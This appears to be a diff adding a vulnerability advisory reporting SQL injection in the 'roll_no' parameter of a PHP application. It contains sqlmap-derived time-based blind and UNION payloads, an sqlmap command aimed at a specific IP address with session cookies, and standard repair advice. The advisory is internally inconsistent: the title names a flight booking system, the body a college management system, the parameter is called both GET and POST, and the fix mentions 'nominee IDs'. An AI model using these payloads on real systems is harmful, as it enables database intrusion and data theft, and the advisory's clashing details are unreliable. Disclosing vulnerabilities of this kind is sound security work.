@@ -1,0 +1,63 @@
+Simple Flight Ticket Booking System V1.0 SQL Injection 
+
+NAME OF AFFECTED PRODUCT(S)
+
+- Simple Flight Ticket Booking System
+
+Vendor Homepage
+
+https://code-projects.org/simple-flight-ticket-booking-system-in-php-with-source-code/
+
+AFFECTED AND/OR FIXED VERSION(S)
+
+- V1.0
+
+Vuldb Submitter
+
+OwenW
+## Vulnerable File
+Vulnerable File
+-/admin/student-fee.php
+
+VERSION(S)
+V1.0
+PROBLEM TYPE
+Vulnerability Type
+SQL Injection
+Root Cause
+A SQL injection vulnerability was found in the "/admin/student-fee.php" file of the "College Management System Project In PHP". The reason for this issue is that attackers can inject malicious code from the parameter 'roll_no' after logging in with valid credentials. The application fails to properly sanitize or validate this input before using it in SQL queries. This allows attackers to manipulate SQL queries and perform unauthorized operations.
+Impact
+Attackers can exploit this SQL injection vulnerability to no unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.
+DESCRIPTION
+During the security review of "College Management System", a critical SQL injection vulnerability was discovered in the "/admin/student-fee.php" file. attackers can inject malicious SQL queries through this parameter. Immediate remedial measures are needed to ensure system security and protect data integrity.
+
+Vulnerability Location:
+'roll_no' parameter (GET)
+POC:
+Parameter: roll_no (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: roll_no=1' AND (SELECT 9463 FROM (SELECT(SLEEP(5)))shSq) AND 'UZoj'='UZoj&submit=Press
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: roll_no=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7162706b71,0x454d525367686a50575a676f734658464554416248665874796d6a6e64416e694e4b556575424543,0x7176716b71),NULL-- -&submit=Press
+AUTHENTICATION REQUIRED
+Exploitation requires authentication or prior access to the system.
+The following are screenshots of some specific Managemen obtained from testing and running with the sqlmap tool:
+python sqlmap.py --random-agent --batch -u "http://38.175.200.188:10015/admin/student-fee.php" --data "roll_no=1&submit=Press" --cookie "PHPSESSID=ncbblmff2r7o7nc9m4vb4a7kp5; xp=MTc3MTE1MTI2NXxEWDhFQVFMX2dBQUJFQUVRQUFBcF80QUFBUVp6ZEhKcGJtY01Dd0FKVTJGbVpVVnVkSEo1Qm5OMGNtbHVad3dJQUFZMk5EazVPV0U9fNrqc0h5MXW_3XKz88feFIMO4QQ0OWoFh8BxJIsyfWB4" --dbms=mysql --current-db
+
+Image
+Suggested Repair
+
+Use Prepared Statements and Parameter Binding:
+Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepared statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
+
+Input Validation and Filtering:
+Strictly validate and filter user input data to ensure it conforms to the expected format. For example, ensure that nominee IDs match a valid numeric pattern.
+
+Minimize Database User Permissions:
+Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as 'root' or 'admin') for daily operations.
+
+Regular Security Audits:
+Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
